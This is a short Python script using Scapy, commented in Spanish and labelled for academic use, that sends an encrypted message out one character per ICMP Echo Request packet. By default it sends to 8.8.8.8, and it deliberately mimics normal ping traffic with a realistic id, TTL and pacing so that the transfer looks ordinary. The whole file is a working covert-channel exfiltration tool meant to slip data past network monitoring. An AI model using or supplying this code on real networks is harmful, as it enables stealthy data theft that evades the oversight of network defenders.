#!/usr/bin/env python3
"""
pingv4.py - Envío stealth de un mensaje cifrado
Un carácter por paquete ICMP Echo Request (campo data).
Uso académico: sudo python3 pingv4.py "mensaje_cifrado"
"""

import sys
from scapy.all import IP, ICMP, Raw, send
import time

def enviar_caracteres(mensaje, destino="8.8.8.8"):
    """
    Envía cada carácter del mensaje en un paquete ICMP Echo Request independiente.
    """
    if not mensaje:
        print("Error: el mensaje está vacío")
        sys.exit(1)

    # Identificador base similar a un ping real
    icmp_id = 0x1234

    for i, caracter in enumerate(mensaje):
        # Construimos el paquete lo más parecido posible a un ping normal
        paquete = (
            IP(dst=destino, ttl=64) /
            ICMP(type=8, code=0, id=icmp_id, seq=i) /
            Raw(load=caracter.encode('utf-8'))
        )

        # Enviamos el paquete (Scapy imprime "Sent 1 packets.")
        send(paquete, verbose=1)

        # Pequeña pausa para no saturar y parecer más natural
        time.sleep(0.2)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Uso: sudo python3 {sys.argv[0]} \"<mensaje_cifrado>\"")
        sys.exit(1)

    mensaje = sys.argv[1]
    print(f"[*] Enviando {len(mensaje)} paquetes ICMP (1 carácter cada uno)...")
    enviar_caracteres(mensaje)
    print("[*] Envío finalizado.")
